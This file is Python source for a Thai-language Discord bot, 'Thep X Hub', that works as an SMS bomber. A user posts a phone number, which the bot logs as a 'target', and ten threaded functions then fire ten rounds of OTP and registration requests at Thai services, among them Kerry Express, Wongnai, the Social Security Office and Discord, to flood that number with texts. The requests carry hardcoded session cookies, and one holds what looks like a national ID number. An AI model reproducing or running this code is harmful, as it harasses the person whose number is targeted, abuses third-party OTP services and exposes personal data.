import free
import interactions
import requests
import time
import os
from interactions import *
from os import system
from interactions import Button, ButtonStyle, CommandContext, SelectMenu, SelectOption, ActionRow, Modal, TextInput, TextStyleType, Embed
from concurrent.futures import ThreadPoolExecutor
from requests import post, Session
from pystyle import Colors, Colorate

# Config

token = free.free_config["token"]

panel = free.free_config["panel_ch"]

use_ch = free.free_config["free_ch"]

log = free.free_config["log_ch"]

# Auto Send

auto_panel = free.free_config["send_panel"]

auto_teach = free.free_config["auto_teach"]

# Open Queue

check_queue = free.free_config["new_queue"]

# Start listen

global data_start

data_start = False # ตรงนี้ห้ามปรับ ไม่งั้นบัค

# Data Sms

global data_phone

data_phone = None

# Data Queue

global data_queue

data_queue = "0"

# Auth Sms

useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
threading = ThreadPoolExecutor(max_workers=int(1000))

bot = interactions.Client(token, intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGE_CONTENT,
    presence=interactions.ClientPresence(
        status=interactions.StatusType.ONLINE,
        activities=[
            interactions.PresenceActivity(name="Test Src...", type=interactions.PresenceActivityType.STREAMING)
        ]
    )
)

@bot.event
async def on_start():
    if auto_teach == "1":
        teach_ch = await interactions.get(bot, interactions.Channel, object_id=use_ch)
        await teach_ch.send("> **วิธีใช้ยิงเบอร์แบบใหม่ ( By Thep X Hub )**\n \n```พิมเบอร์ใส่ได้เลยครับ```\n")    
    else:
        return
    if auto_panel == "1":
        panel_ch = await interactions.get(bot, interactions.Channel, object_id=panel)
        main_panel = interactions.Embed(title="Thep X Hub ( SRC )", description="_ _")
        main_panel.add_field(name="**สถานะการใช้งาน**", value="_ _\n```ปิดใช้งาน```\n_ _")
        x1 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x1",
            label="X",
            disabled=True
        )
        x2 = Button(
            style=ButtonStyle.SECONDARY,
            custom_id="x2",
            label="ระบบยิงเบอร์ออโต้",
            disabled=True
        )
        x3 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x3",
            label="X",
            disabled=True
        )
        x4 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x4",
            label="X",
            disabled=True
        )
        status_listen = Button(
            style=ButtonStyle.DANGER,
            custom_id="status_listen",
            label="ปิดอยู่ ( กดเพื่อเปิด )",
        )
        x5 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x5",
            label="X",
            disabled=True
        )
        x6 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x6",
            label="X",
            disabled=True
        )
        status_listen01 = Button(
            style=ButtonStyle.SUCCESS,
            custom_id="status_listen01",
            label="เปิดอยู่ ( กดเพื่อปิด )",
            disabled=True
        )
        x8 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x8",
            label="X",
            disabled=True
        )
        await panel_ch.send(embeds=main_panel, components=[[x1, x2, x3], [x4, status_listen, x5], [x6,status_listen01,x8]])
    else:
        return

@bot.component("status_listen")
async def auth_close(ctx: interactions.ComponentContext):
    global data_start
    if data_start == False:
        data_start = True
        main_panel01 = interactions.Embed(title="Thep X Hub ( SRC )", description="_ _")
        main_panel01.add_field(name="**สถานะการใช้งาน**", value="_ _\n```เปิดใช้งาน```\n_ _")
        x1 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x1",
            label="X",
            disabled=True
        )
        x2 = Button(
            style=ButtonStyle.SECONDARY,
            custom_id="x2",
            label="ระบบยิงเบอร์ออโต้",
            disabled=True
        )
        x3 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x3",
            label="X",
            disabled=True
        )
        x4 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x4",
            label="X",
            disabled=True
        )
        status_listen = Button(
            style=ButtonStyle.DANGER,
            custom_id="status_listen",
            label="ปิดอยู่ ( กดเพื่อเปิด )",
            disabled=True
        )
        x5 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x5",
            label="X",
            disabled=True
        )
        x6 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x6",
            label="X",
            disabled=True
        )
        status_listen01 = Button(
            style=ButtonStyle.SUCCESS,
            custom_id="status_listen01",
            label="เปิดอยู่ ( กดเพื่อปิด )",
        )
        x8 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x8",
            label="X",
            disabled=True
        )
        await ctx.edit(embeds=main_panel01, components=[[x1, x2, x3], [x4, status_listen, x5], [x6,status_listen01,x8]])
    elif data_start == True:
        eror_panel01 = interactions.Embed(title="Thep X Hub ( SRC )", description="_ _")
        eror_panel01.add_field(name="**สถานะการใช้งาน**", value="_ _\n```Eror```\n_ _")   
        await ctx.edit(embeds=eror_panel01)

@bot.component("status_listen01")
async def auth_open(ctx: interactions.ComponentContext):
    global data_start
    if data_start == True:
        data_start = False
        main_panel02 = interactions.Embed(title="Thep X Hub ( SRC )", description="_ _")
        main_panel02.add_field(name="**สถานะการใช้งาน**", value="_ _\n```ปิดใช้งาน```\n_ _")
        x1 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x1",
            label="X",
            disabled=True
        )
        x2 = Button(
            style=ButtonStyle.SECONDARY,
            custom_id="x2",
            label="ระบบยิงเบอร์ออโต้",
            disabled=True
        )
        x3 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x3",
            label="X",
            disabled=True
        )
        x4 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x4",
            label="X",
            disabled=True
        )
        status_listen = Button(
            style=ButtonStyle.DANGER,
            custom_id="status_listen",
            label="ปิดอยู่ ( กดเพื่อเปิด )",
        )
        x5 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x5",
            label="X",
            disabled=True
        )
        x6 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x6",
            label="X",
            disabled=True
        )
        status_listen01 = Button(
            style=ButtonStyle.SUCCESS,
            custom_id="status_listen01",
            label="เปิดอยู่ ( กดเพื่อปิด )",
            disabled=True
        )
        x8 = Button(
            style=ButtonStyle.PRIMARY,
            custom_id="x8",
            label="X",
            disabled=True
        )
        await ctx.edit(embeds=main_panel02, components=[[x1, x2, x3], [x4, status_listen, x5], [x6,status_listen01,x8]])
    elif data_start == False:
        eror_panel02 = interactions.Embed(title="Thep X Hub ( SRC )", description="_ _")
        eror_panel02.add_field(name="**สถานะการใช้งาน**", value="_ _\n```Eror```\n_ _")   
        await ctx.edit(embeds=eror_panel02)



@bot.event
async def on_message_create(message: Message):
    global data_start
    global data_phone
    global check_queue
    global data_queue
    if message.channel_id == use_ch:
        if message.author.bot is True:
            return
        else:
            if data_start == False:
                await message.reply("ระบบปิดอยู่ กรุณาเปิดก่อนใช้งาน !!") 
                await message.delete()    
            elif data_start == True:
                if check_queue == "1":
                    if data_queue == "0":
                        data_queue = "1"
                        data_phone = message.content
                        await message.delete()
                        log_ch = await interactions.get(bot, interactions.Channel, object_id=log)
                        main_log = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                        main_log.add_field(name="**เป้าหมาย**", value=f"_ _\n```fix\n{data_phone}\n```\n_ _")
                        await log_ch.send(embeds=main_log)
                        i = 0
                        while i < 10:
                            i += 1
                            log_ch01 = await interactions.get(bot, interactions.Channel, object_id=log)
                            main_log01 = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                            main_log01.add_field(name="> **เป้าหมาย**", value=f"_ _\n```fix\n{data_phone}\n```\n_ _")
                            main_log01.add_field(name="_ _", value=f"จำนวนรอบยิง: {i} / 10")
                            await log_ch01.send(embeds=main_log01)    
                            phone = data_phone
                            Free_core(phone)       
                        else:
                            log_ch02 = await interactions.get(bot, interactions.Channel, object_id=log)
                            main_log02 = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                            main_log02.add_field(name="> **สถานะการยิง**", value=f"_ _\n```diff\n+ ยิงเบอร์ {data_phone} เสร็จแล้วครับ !!\n```\n_ _")
                            await log_ch02.send(embeds=main_log02) 
                    elif data_queue == "1":
                        await message.reply("มีคิวก่อนน้าคุณ 1 คิว !!")
                        await message.delete()
                elif check_queue == "2":
                    data_phone = message.content
                    await message.delete()
                    log_ch = await interactions.get(bot, interactions.Channel, object_id=log)
                    main_log = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                    main_log.add_field(name="**เป้าหมาย**", value=f"_ _\n```fix\n{data_phone}\n```\n_ _")
                    await log_ch.send(embeds=main_log)
                    i = 0
                    while i < 10:
                        i += 1
                        log_ch01 = await interactions.get(bot, interactions.Channel, object_id=log)
                        main_log01 = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                        main_log01.add_field(name="> **เป้าหมาย**", value=f"_ _\n```fix\n{data_phone}\n```\n_ _")
                        main_log01.add_field(name="_ _", value=f"จำนวนรอบยิง: {i} / 10")
                        await log_ch01.send(embeds=main_log01)    
                        free = data_phone   
                        Free_core(phone)    
                    else:
                        log_ch02 = await interactions.get(bot, interactions.Channel, object_id=log)
                        main_log02 = interactions.Embed(title="Thep X Hub ( LOG )", description="_ _")
                        main_log02.add_field(name="> **สถานะการยิง**", value=f"_ _\n```diff\n+ ยิงเบอร์ {data_phone} เสร็จแล้วครับ !!\n```\n_ _")
                        await log_ch02.send(embeds=main_log02)

def v4_api1(phone):
    global im
    global mnc
    auth = requests.post(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
    print(auth.status_code)
        
        

def v4_api2(phone):
    global im
    global mnc
    auth = requests.post("https://discord.com/api/v9/auth/register/phone",headers={"Host": "discord.com","user-agent":"Discord-Android/105013","cookie":"__sdcfduid=608d2eac694211ec997a42010a0a0a4cd23801e46be73b7cba2279670205f0eb934ffd2384782ecb8a365045135a8998; __dcfduid=608d2eac694211ec997a42010a0a0a4c"},json={"phone":"+66"+phone})
    print(auth.status_code)


def v4_api3(phone):
    global im
    global mnc
    auth = requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
    print(auth.status_code)

def v4_api4(phone):
    global im
    global mnc
    auth = requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})
    print(auth.status_code)
    
def v4_api5(phone):
    global im
    global mnc
    auth = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
    print(auth.status_code)

def v4_api6(phone):
    global im
    global mnc
    auth = requests.get(f"https://api.joox.com/web-fcgi-bin/web_acamount_manager?optype=5&os_type=2&amountry_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
    print(auth.status_code)

def v4_api7(phone):
    global im
    global mnc
    auth = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
    print(auth.status_code)

def v4_api8(phone):
    global im
    global mnc
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
        }
    auth = requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retryamount=0")
    print(auth.status_code)
    
def v4_api9(phone):
    global im
    global mnc
    auth = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
    print(auth.status_code)

def v4_api10(phone):
    global im
    global mnc
    auth = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"amountry":"66"},"type":"mobile"})
    print(auth.status_code)

def Free_core(phone):
    threading.submit(v4_api1, phone)
    threading.submit(v4_api2, phone)
    threading.submit(v4_api3, phone)
    threading.submit(v4_api4, phone)
    threading.submit(v4_api5, phone)
    threading.submit(v4_api6, phone)
    threading.submit(v4_api7, phone)
    threading.submit(v4_api8, phone)
    threading.submit(v4_api9, phone)
    threading.submit(v4_api10, phone)

bot.start()